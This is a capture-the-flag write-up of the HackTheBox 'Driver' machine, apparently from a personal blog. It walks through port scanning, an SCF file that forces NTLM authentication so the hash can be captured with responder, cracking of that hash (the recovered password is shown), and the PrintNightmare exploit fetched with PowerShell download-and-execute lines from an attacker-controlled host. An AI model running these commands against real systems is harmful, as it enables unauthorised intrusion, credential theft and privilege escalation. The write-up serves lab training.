---
layout: default
title : muzec - Driver - HackTheBox
---


### Enumeration With Nmap

`nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.106`

```
# Nmap 7.91 scan initiated Wed Dec  1 08:23:44 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.106
Increasing send delay for 10.10.11.106 from 0 to 5 due to 11 out of 17 dropped probes since last increase.
Nmap scan report for 10.10.11.106
Host is up (0.26s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Dec  1 08:25:21 2021 -- 1 IP address (1 host up) scanned in 97.47 seconds
```

Now let use nmap default script and service detection to get more information from the target.

`nmap -sC -sV -oA nmap/normal -p 80,135,445,5985 10.10.11.106`

```
# Nmap 7.91 scan initiated Wed Dec  1 08:25:42 2021 as: nmap -sC -sV -oA nmap/normal -p 80,135,445,5985 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up (0.27s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 9h59m53s, deviation: 0s, median: 9h59m53s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-01T17:25:51
|_  start_date: 2021-12-01T13:29:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  1 08:26:33 2021 -- 1 IP address (1 host up) scanned in 51.33 seconds
```

So we are dealing with a windows is cool i guess i know it been long we work on a windows so let just jump into to fire on. so we have some interesting ports like HTTP,SMB and WINRM let start our enumeration on SMB to see if we have anonymous access to a share.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106]
└─$ smbclient -L //10.10.11.106/ -N    
session setup failed: NT_STATUS_ACCESS_DENIED
```

Boom no anonymous access to connect to SMB seems it time to see what we have on the HTTP port.

![image](https://user-images.githubusercontent.com/69868171/144460282-76a88b48-f61a-4174-9fa6-737fd267a8cc.png)

Seems we need a credentials let try using `admin/admin` .

![image](https://user-images.githubusercontent.com/69868171/144460465-ad35fdd9-e86c-4526-9623-f1eb77c4ac0c.png)

Boom we are in let look arounf to see what we can find and loot.

![image](https://user-images.githubusercontent.com/69868171/144460955-73a4ba3a-072b-4e72-a821-db4aa20ad318.png)

So we found a upload page seems interesting i try uploading a php reverse shell to see what would happened but guess what nothing and i was unable to get the location the php file was store so i decided to read around and get more infromation of what we are dealing with.

###  Forced Authentication In Windows


Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. [1] This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.

`Credential Access, Stealing hashes` Some pretty good resources here [Forced Authentication](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication) now back to exploit it.

### Execution via .SCF

Place the below `fa.scf` file on the attacker controlled machine at `10.0.0.7` in a shared folder `tools` that i will be creating.

```
[Shell]
Command=2
IconFile=\\10.0.0.5\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```


```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106]
└─$ cd tools
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106/tools]
└─$ ls
@fa.scf
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106/tools]
└─$ cat @fa.scf
[Shell]
Command=2
IconFile=\\10.0.0.5\share\muzec.ico
[Taskbar]
Command=ToggleDesktop                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106/tools]
```

A victim user low opens the share `\\10.0.0.7\tools` and the `fa.scf` gets executed automatically, which in turn forces the victim system to attempt to authenticate to the attacking system at `10.0.0.5` where responder is listening:

```
sudo responder -I tun0 -wrfv
```

![image](https://user-images.githubusercontent.com/69868171/144466914-adf34f22-0eed-443a-81d9-0554fa545c7e.png)

Now let upload the `@fa.scf` file.

![image](https://user-images.githubusercontent.com/69868171/144467178-e82c802b-bf00-4f81-85d3-73a0e26d379f.png)

Now let submit upload and go back to see what `responder` have for us.

![image](https://user-images.githubusercontent.com/69868171/144471085-8621135b-2e16-4aac-85fc-2e4ac62630b3.png)

Boom hashes flying lol now let save the hash in file to crack using john the ripper.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106]
└─$ cat hash   
tony::DRIVER:8a951208ff761ccb:84E8A643D43D7A11C1079DC2518D854B:0101000000000000C0653150DE09D201260A1A1D9BF576BD000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000BDA5F8BCE4AC6BDB9CA217BA5B8DE361269F945ABF489FF68EE134226EBB88CC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003700000000000000000000000000
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106]
└─$ john --wordlis=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106]
└─$ john --show hash                                    
tony:liltony:DRIVER:8a951208ff761ccb:84E8A643D43D7A11C1079DC2518D854B:0101000000000000C0653150DE09D201260A1A1D9BF576BD000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000BDA5F8BCE4AC6BDB9CA217BA5B8DE361269F945ABF489FF68EE134226EBB88CC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003700000000000000000000000000

1 password hash cracked, 0 left
```

Now seems we have the winrm port open `5985` let hit it with the credentials using `evil-winrm` .


```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106]
└─$ evil-winrm -i driver.htb -u tony                                               
Enter Password: 
```

Boom we are in.

![image](https://user-images.githubusercontent.com/69868171/144472232-630f3a2b-7402-46d4-a3b6-b6505c2d40a6.png)

We have `user.txt` it time to get system. I really spend some time here man run `winpeas` but got nothing so when doing reserach i found something cool about a printer.

![image](https://user-images.githubusercontent.com/69868171/144473184-63ebc441-1ac9-4b84-a5e8-e53084f57cf6.png)

Since the machine is related to a printer let give it a shot and confirm if it really vulnerable.

### Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 Summary

A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

UPDATE July 7, 2021: The security update for Windows Server 2012, Windows Server 2016 and Windows 10, Version 1607 have been released. Please see the Security Updates table for the applicable update for your system. We recommend that you install these updates immediately. If you are unable to install these updates, see the FAQ and Workaround sections in this CVE for information on how to help protect your system from this vulnerability.

In addition to installing the updates, in order to secure your system, you must confirm that the following registry settings are set to 0 (zero) or are not defined (Note: These registry keys do not exist by default, and therefore are already at the secure setting.), also that your Group Policy setting are correct (see FAQ):


    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    NoWarningNoElevationOnInstall = 0 (DWORD) or not defined (default setting)
    UpdatePromptSettings = 0 (DWORD) or not defined (default setting)

Having NoWarningNoElevationOnInstall set to 1 makes your system vulnerable by design.

UPDATE July 6, 2021: Microsoft has completed the investigation and has released security updates to address this vulnerability. Please see the Security Updates table for the applicable update for your system. We recommend that you install these updates immediately. If you are unable to install these updates, see the FAQ and Workaround sections in this CVE for information on how to help protect your system from this vulnerability. See also KB5005010: Restricting installation of new printer drivers after applying the July 6, 2021 updates.

Note that the security updates released on and after July 6, 2021 contain protections for CVE-2021-1675 and the additional remote code execution exploit in the Windows Print Spooler service known as “PrintNightmare”, documented in CVE-2021-34527.

### Exploiting

```
Get-Service -Name Spooler
```

![image](https://user-images.githubusercontent.com/69868171/144479038-14f8fa3d-df16-418a-8f62-f4df5f186fa6.png)

Boom we have it running now let exploit it.

![image](https://user-images.githubusercontent.com/69868171/144479153-f4639778-8a52-4c47-8ae3-9c194a57e1c1.png)

Written in powershell let download it and transfer it to our target.

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.77:8000/CVE-2021-34527.ps1')"
```

![image](https://user-images.githubusercontent.com/69868171/144479495-115ab05a-7e5e-461e-ba8a-48a754a03419.png)

But when i try to run the powershell script i got failed so i decided to transfer it again.

```
iex (New-Object Net.WebClient).DownloadString("http://10.10.14.77:8000/CVE-2021-34527.ps1")
```

![image](https://user-images.githubusercontent.com/69868171/144480142-8b04a928-7ba8-4c7c-a3a2-8efc73098dc5.png)

So let run it again.

```
Invoke-Nightmare -DriverName "Xerox" -NewUser "muzec" -NewPassword "muzec"
```

![image](https://user-images.githubusercontent.com/69868171/144480254-c1c5a352-4ecb-47d8-bd71-cb2c97aba5f2.png)

Boom Boom exploited successfully and `muzec` was added as local administrator cool let confirm it.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.106]
└─$ evil-winrm -i driver.htb -u muzec
```

![image](https://user-images.githubusercontent.com/69868171/144480919-5706b948-4790-4402-b2f6-e88c33244392.png)

We are done thanks for reading man.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
